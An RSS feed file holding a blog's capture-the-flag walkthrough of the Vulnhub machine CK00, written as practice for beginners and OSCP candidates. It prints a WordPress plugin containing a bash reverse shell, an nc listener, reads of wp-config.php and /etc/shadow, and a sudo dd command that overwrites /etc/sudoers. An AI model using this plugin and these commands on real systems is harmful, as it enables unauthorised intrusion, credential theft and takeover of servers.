@@ -1,0 +1,147 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>ck00 walkthrough Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/ck00-walkthrough/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/ck00-walkthrough/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Tue, 07 Apr 2020 16:14:02 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>ck00 walkthrough Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/ck00-walkthrough/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>CK00: Vulnhub Walkthrough &#124; Infosec Warrior CTF</title>
+		<link>https://www.armourinfosec.com/ck00-vulnhub-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/ck00-vulnhub-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Tue, 31 Mar 2020 08:57:21 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[ck00 walkthrough]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25791</guid>
+
+					<description><![CDATA[<p>I will share with you a new Walkthrough for Vulnhub machines. CK00: Vulnhub Walkthrough for the CTF Challenge Created by...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/ck00-vulnhub-walkthrough/">CK00: Vulnhub Walkthrough | Infosec Warrior CTF</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I will share with you a new Walkthrough for Vulnhub machines. CK00: Vulnhub Walkthrough for the CTF Challenge Created by Vishal Biswas AKA Cyberknight. You can download here this <a href="https://www.vulnhub.com/entry/ck-00,444/">CTF</a> . It states the level is Easy and that is true. Again, this is in the eye of the beholder but I&#8217;ve seen some boxes where Easy isn&#8217;t exactly Easy. Or maybe it&#8217;s Easy but it&#8217;s a CTF style box. This isn&#8217;t that type of box. It&#8217;s just a poorly configured machine and it has either a few rabbit holes or a few steps I just skipped because you can. Either way, you explore a little if this is unfamiliar and that&#8217;s how you learn.</p>
+<h3><strong><img decoding="async" fetchpriority="high" class="alignnone wp-image-25792 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-47-13-e1586276000418.png" alt="ck00 login" width="407" height="185" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-47-13-e1586276000418.png 407w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-47-13-e1586276000418-300x136.png 300w" sizes="(max-width: 407px) 100vw, 407px" /></strong></h3>
+<h3><strong>Penetration Testing Methodologies</strong></h3>
+<p><strong>Network Scan</strong></p>
+<ul>
+<li>Netdicover</li>
+<li>Nmap</li>
+</ul>
+<p><strong>Enumeration</strong></p>
+<ul>
+<li>WordPress Enumeration</li>
+<li>Local Hosts file entry</li>
+</ul>
+<p><strong>Exploit</strong></p>
+<ul>
+<li>
+<p class="card-title text-secondary text-center">WordPress plugin php injection.</p>
+</li>
+</ul>
+<p><strong>Privilege Escalation</strong></p>
+<ul>
+<li>Horizontal Privilege Escalation</li>
+<li>wp-config.php</li>
+<li>sudo -l</li>
+</ul>
+<h4>Network Scanning</h4>
+<p>So, as we always start with <strong>netdiscover</strong> to get the IP of the VM machine and the IP of the host I’ve found is 192.168.2.4</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">netdiscover -i vboxnet0</pre>
+<p><img decoding="async" class="alignnone wp-image-25793 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-52-11.png" alt="ck00 ip" width="550" height="118" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-52-11.png 550w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-52-11-300x64.png 300w" sizes="(max-width: 550px) 100vw, 550px" /></p>
+<p>Let’s proceed with network scan using Nmap aggressive scan as given below.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">nmap -p- -sC -A -O 192.168.2.4</pre>
+<p><img decoding="async" class="alignnone wp-image-25794 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-54-55.png" alt="ck00 nmap" width="660" height="447" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-54-55.png 660w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-54-55-300x203.png 300w" sizes="(max-width: 660px) 100vw, 660px" /></p>
+<h3>Enumeration</h3>
+<p>First thing we notice is port 80 is open and we see WordPress. When we check out the port in the browser.</p>
+<p><img decoding="async" class="alignnone wp-image-25795 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-10-41.png" alt="ck00 wp" width="738" height="685" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-10-41.png 738w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-10-41-300x278.png 300w" sizes="(max-width: 738px) 100vw, 738px" /></p>
+<p>We can see from the malformed page that we need to add an entry into our hosts file. When we try to access the admin page, we see what name we need to use in our hosts file</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">vim /etc/hosts</pre>
+<p><img decoding="async" class="alignnone wp-image-25796 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-12-11.png" alt="ck00 host" width="419" height="87" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-12-11.png 419w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-12-11-300x62.png 300w" sizes="(max-width: 419px) 100vw, 419px" /></p>
+<p>Eureka !!!!!!!!!! It&#8217;s work and finally got wordpress.</p>
+<p><img decoding="async" class="alignnone wp-image-25797 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27.png" alt="ck00 web" width="944" height="557" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27.png 944w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27-300x177.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27-768x453.png 768w" sizes="(max-width: 944px) 100vw, 944px" /></p>
+<p>Now when we attempt to access the admin page, with credential <strong>admin:admin</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25798 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-16-41.png" alt="ck00 login" width="365" height="494" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-16-41.png 365w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-16-41-222x300.png 222w" sizes="(max-width: 365px) 100vw, 365px" /></p>
+<h3>Exploit</h3>
+<p>When I first started hacking and I came across a WordPress set, I would try all sorts of things to get PHP code into the site. Sometimes you can upload a shell as a plugin, sometimes you can upload a shell as media, both are intentional misconfigurations, and there are plugins that also allow for PHP.</p>
+<p>You can just write your own <a href="https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell" target="_blank" rel="noopener noreferrer">Reverse Shell Plugin</a>.  Save yourself some headaches, just make this, use it, and store it for later use.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">touch rshell.php
+vim rshell.php
+ &lt;?php
+ 
+ /**
+ * Plugin Name: Reverse Shell Plugin
+ * Plugin URI:
+ * Description: Reverse Shell Plugin
+ * Version: 1.0
+ * Author: Dasagreeva
+ * Author URI: https://armourinfosec.com/
+ */
+ exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/LHOST/LPORT 0&gt;&amp;1'");
+ ?&gt;
+zip rshellplugin.zip rshell.php</pre>
+<p><img decoding="async" class="alignnone wp-image-25799 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-50-02.png" alt="ck00 shell" width="471" height="412" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-50-02.png 471w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-50-02-300x262.png 300w" sizes="(max-width: 471px) 100vw, 471px" /></p>
+<p>Once we get it zipped, we move to the <strong>WordPress UI</strong>. Under <strong>Plugins</strong>, we select <strong>Add New</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25800 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-1024x377.png" alt="ck00 plugin" width="1024" height="377" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-1024x377.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-300x111.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-768x283.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57.png 1053w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>We activate our <strong>plugin</strong>:</p>
+<p><img decoding="async" class="alignnone wp-image-25801 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-53-40.png" alt="ck00 rv" width="761" height="292" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-53-40.png 761w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-53-40-300x115.png 300w" sizes="(max-width: 761px) 100vw, 761px" /></p>
+<p>We catch our shell. Yesssssssssssss&#8230;&#8230;&#8230;</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">nc -nlvp 1505</pre>
+<p><img decoding="async" class="alignnone wp-image-25802 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-55-10.png" alt="ck00 nc" width="681" height="253" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-55-10.png 681w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-55-10-300x111.png 300w" sizes="(max-width: 681px) 100vw, 681px" /></p>
+<h3><strong>Privilege Escalation</strong></h3>
+<p>We look around for user flag and found it.</p>
+<p><img decoding="async" class="alignnone wp-image-25803 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-01-48.png" alt="ck00 wwwdata" width="347" height="317" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-01-48.png 347w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-01-48-300x274.png 300w" sizes="(max-width: 347px) 100vw, 347px" /></p>
+<p>We then move to <strong>wp</strong>&#8211;<strong>config</strong>.<strong>php</strong> file for credentials.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">cat /var/www/html/wp-config.php</pre>
+<p><img decoding="async" class="alignnone wp-image-25804 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-07-37.png" alt="ck00 sql" width="496" height="478" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-07-37.png 496w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-07-37-300x289.png 300w" sizes="(max-width: 496px) 100vw, 496px" /></p>
+<p>got password <strong>bla_is_my_password</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25805 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-16-15.png" alt="CK00: Vulnhub Walkthrough" width="335" height="398" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-16-15.png 335w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-16-15-253x300.png 253w" sizes="(max-width: 335px) 100vw, 335px" /></p>
+<p>Excellent! Here&#8217;s where we cut out a step or two. I saw a few things and maybe that&#8217;s how I&#8217;m supposed to get to bla1 but on a hunch, I guess the password is: <strong>bla1_is_my_password</strong>. I got ssh connection.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">ssh bla1@192.168.2.4</pre>
+<p><img decoding="async" class="alignnone wp-image-25806 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-01-38.png" alt="CK00: Vulnhub Walkthrough" width="670" height="242" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-01-38.png 670w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-01-38-300x108.png 300w" sizes="(max-width: 670px) 100vw, 670px" /></p>
+<p>Checking out my <strong>sudo privileges</strong>, I learn that I can execute <strong>/bin/rbash as the user ck-00</strong> which essentially moves us into the next account.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">sudo -u ck-00 /bin/rbash</pre>
+<p><img decoding="async" class="alignnone wp-image-25807 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07.png" alt="CK00: Vulnhub Walkthrough" width="676" height="246" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07.png 676w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07-300x109.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07-672x246.png 672w" sizes="(max-width: 676px) 100vw, 676px" /></p>
+<p>There is  sudo privileges as our new user.We can execute <strong>/bin/dd</strong> as <strong>root</strong>. dd  allows us to &#8220;convert and copy a file&#8221; and it&#8217;s used for backups. We can also use it to read and write files.We should be able to read the /etc/shadow file as root.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">sudo dd if=/etc/shadow</pre>
+<p><img decoding="async" class="alignnone wp-image-25808 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17.png" alt="CK00: Vulnhub Walkthrough" width="675" height="176" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17.png 675w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17-300x78.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17-672x176.png 672w" sizes="(max-width: 675px) 100vw, 675px" /></p>
+<p>Excellent! We should also be able to write a new line into sudoers</p>
+<p><img decoding="async" class="alignnone wp-image-25809 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57.png" alt="CK00: Vulnhub Walkthrough" width="836" height="192" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57.png 836w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57-300x69.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57-768x176.png 768w" sizes="(max-width: 836px) 100vw, 836px" /></p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">echo "ck-00 ALL=(ALL) NOPASSWD: ALL" | sudo dd of=/etc/sudoers</pre>
+<p><img decoding="async" class="alignnone wp-image-25812 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-40-23.png" alt="CK00: Vulnhub Walkthrough" width="553" height="147" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-40-23.png 553w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-40-23-300x80.png 300w" sizes="(max-width: 553px) 100vw, 553px" /></p>
+<p>root flag&#8230;..</p>
+<p><img decoding="async" class="alignnone wp-image-25813 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-1024x346.png" alt="CK00: Vulnhub Walkthrough" width="1024" height="346" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-1024x346.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-300x101.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-768x259.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08.png 1119w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>Conclusion: It was an easy CTF with some loop and really nice concepts. It was really helpful for beginners and people preparing for OSCP. Thank to Vishal Biswas AKA Cyberknight . I hope to see more challenges like this in the future.</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/ck00-vulnhub-walkthrough/">CK00: Vulnhub Walkthrough | Infosec Warrior CTF</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/ck00-vulnhub-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
